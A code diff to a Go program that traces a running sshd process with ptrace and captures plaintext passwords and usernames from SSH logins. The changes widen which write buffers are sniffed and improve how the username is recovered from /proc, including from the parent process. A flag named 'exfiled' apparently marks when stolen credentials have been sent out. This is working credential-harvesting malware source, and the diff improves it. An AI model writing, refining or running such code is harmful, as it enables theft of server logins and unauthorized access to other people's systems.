@@ -5,6 +5,8 @@ import (
 	"io/ioutil"
 	"regexp"
 	"runtime"
+	"strconv"
+	"strings"
 	"syscall"
 )
 
@@ -40,9 +42,9 @@ func traceSSHDProcess(pid int) {
 
 			if regs.Orig_rax == 1 {
 				fd := int(regs.Rdi)
-				if fd >= 0 && fd <= 10 {
+				if fd >= 0 && fd <= 20 {
 					bufferSize := int(regs.Rdx)
-					if bufferSize > 4 && bufferSize < 250 {
+					if bufferSize > 3 && bufferSize < 250 {
 						buffer := make([]byte, bufferSize)
 						_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 						if err != nil {
@@ -51,11 +53,14 @@ func traceSSHDProcess(pid int) {
 						}
 
 						var password string
+
 						if len(buffer) >= 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 {
 							length := int(buffer[3])
 							if length > 0 && length+4 <= len(buffer) {
 								password = string(buffer[4 : 4+length])
 							} else if length == 0 && len(buffer) > 4 {
+								password = string(buffer[4:])
+							} else {
 								password = string(buffer)
 							}
 						} else {
@@ -64,11 +69,32 @@ func traceSSHDProcess(pid int) {
 
 						password = removeNonPrintableAscii(password)
 						if isValidPassword(password) {
-							username := "root"
+							username := "unknown"
 							cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-							matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
+							cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")
+
+							usernamePattern := regexp.MustCompile(`sshd[^:]*:\s*([a-zA-Z0-9_-]+)`)
+							matches := usernamePattern.FindStringSubmatch(cmdlineStr)
 							if len(matches) == 2 {
-								username = string(matches[1])
+								username = matches[1]
+							}
+
+							if username == "unknown" && strings.Contains(cmdlineStr, "[accepted]") {
+								ppidData, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
+								if err == nil {
+									ppidStr := strings.Fields(string(ppidData))
+									if len(ppidStr) > 3 {
+										ppid, _ := strconv.Atoi(ppidStr[3])
+										if ppid > 0 {
+											parentCmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid))
+											parentCmdlineStr := strings.ReplaceAll(string(parentCmdline), "\x00", " ")
+											parentMatches := usernamePattern.FindStringSubmatch(parentCmdlineStr)
+											if len(parentMatches) == 2 {
+												username = parentMatches[1]
+											}
+										}
+									}
+								}
 							}
 
 							if exfiled {
